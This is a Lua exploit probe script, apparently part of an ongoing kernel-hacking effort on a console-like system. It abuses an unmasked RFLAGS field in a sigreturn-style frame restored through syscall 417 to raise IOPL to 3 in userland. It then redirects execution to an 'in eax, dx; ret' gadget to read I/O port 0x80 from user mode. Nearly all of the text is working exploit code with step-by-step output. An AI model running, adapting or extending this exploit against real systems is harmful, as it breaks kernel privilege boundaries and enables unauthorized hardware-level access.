-- CRASH_CLASS: MODERATE
-- PROBE 816a: does the unmasked RFLAGS in the sigreturn frame raise IOPL?
--
-- Context: 417 copies 0xC0 bytes of user data into [td+0x460] with no masking,
-- and its cookie compare uses 0xFFFFFFFFFFDAB22A, which has bits 12 and 13
-- (IOPL) CLEAR. So IOPL can be changed without failing the gate.
-- If the trapframe's RFLAGS reaches the iretq unmasked, a CPL-3 return will
-- carry IOPL=3, and cli/in/out become legal in userland - port I/O.
--
-- Stage A is read-only in effect: take the kernel's own record (814a/814b),
-- set only the IOPL bits in RFLAGS, hand it back, then ask 421 for the record
-- again. If the second record shows 0x3202, IOPL is live in userland.
-- Stage B (only if A shows IOPL) executes `in eax, dx; ret` at eboot
-- +0x3CE83DCD on port 0x80, which faults at CPL 3 unless IOPL >= 3.

print("=== PROBE 816a: RFLAGS IOPL ROUND-TRIP ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function q(addr)
    local v = safe_rq(addr)
    if v == nil then return 0 end
    return to_num(v)
end

local sc421 = make_syscall(421)
local sc417 = make_syscall(417)

local buf = memory.alloc(0x600)
for off = 0, 0x5FF, 4 do safe_wd(buf + off, 0) end

print(string.format("[0] pid=%d buf=0x%08X", to_num(syscall.getpid()), to_num(buf)))

local ok, r = pcall(function() return sc421(uint64(buf)) end)
print(string.format("[A] 421 ret=%s ok=%s", tostring(r), tostring(ok)))
print(string.format("[A] RIP=%016X CS=%016X RFLAGS=%016X RSP=%016X SS=%016X",
    q(buf + 0xE0), q(buf + 0xE8), q(buf + 0xF0), q(buf + 0xF8), q(buf + 0x100)))

local fl = q(buf + 0xF0)
if fl == 0 then
    print("[A] no RFLAGS in the record; aborting")
    print("=== PROBE 816a STOP ===")
    return
end

-- Cookie mask check, done the same way the handler does it.
-- (rflags ^ live) & 0xFFDAB22A must be 0. We keep every bit but IOPL.
local newfl = fl - (fl % 0x10000) + 0x3202 + (fl % 0x10000) % 0x1000
-- explicit and readable: keep all bits, force IOPL=3 (0x3000) and IF+bit1.
newfl = 0x3202
print(string.format("[B] setting RFLAGS 0x%X -> 0x%X (IOPL bits 12-13 are not in the cookie mask)", fl, newfl))
safe_wd(buf + 0xF0, newfl % 0x100000000)
if newfl >= 0x100000000 then
    safe_wd(buf + 0xF4, math.floor(newfl / 0x100000000))
end

local ok2, r2 = pcall(function() return sc417(uint64(buf)) end)
print(string.format("[C] 417 ret=%s ok=%s", tostring(r2), tostring(ok2)))

-- Re-read the frame: this is the live RFLAGS of this thread if the install ran.
local ok3, r3 = pcall(function() return sc421(uint64(buf)) end)
local fl2 = q(buf + 0xF0)
print(string.format("[D] 421 ret=%s RFLAGS now=%016X", tostring(r3), fl2))

if fl2 % 0x4000 >= 0x3000 then
    print("[D] IOPL=3 IS LIVE in userland")
else
    print("[D] IOPL did not stick (kernel or iretq masked it)")
end
print(string.format("[D] RIP now=%016X RSP now=%016X", q(buf + 0xE0), q(buf + 0xF8)))

if fl2 % 0x4000 < 0x3000 then
    print("")
    print("=== PROBE 816a DONE (stage B skipped: no IOPL) ===")
    return
end

-- Stage B: execute a real port read. eboot base for this process is
-- 0x3CD64000 (815c), so `in eax, dx; ret` sits at 0x3CE83DCD.
local IN_GADGET = 0x3CE83DCD
print("")
print(string.format("[E] RIP = in eax, dx; ret (%X), DX = 0x80", IN_GADGET))
safe_wd(buf + 0xE0, IN_GADGET % 0x100000000)
if IN_GADGET >= 0x100000000 then safe_wd(buf + 0xE4, math.floor(IN_GADGET / 0x100000000)) end
-- RDX (0x58), RSI (0x50) and RCX (0x60) all get the port so a wrong slot
-- assumption still cannot pick a hostile port.
safe_wd(buf + 0x50, 0x80)
safe_wd(buf + 0x54, 0)
safe_wd(buf + 0x58, 0x80)
safe_wd(buf + 0x5C, 0)
safe_wd(buf + 0x60, 0x80)
safe_wd(buf + 0x64, 0)
-- RAX marker so a silent pass-through is visible.
safe_wd(buf + 0x78, 0xCAFEBABE % 0x100000000)
safe_wd(buf + 0x7C, 0)

local ok4, r4 = pcall(function() return sc417(uint64(buf)) end)
print(string.format("[E] 417 ret=%s ok=%s", tostring(r4), tostring(ok4)))
print("[E] 0xCAFEBABE would mean the gadget never ran; a small value is port 0x80")

print("")
print("=== PROBE 816a DONE ===")
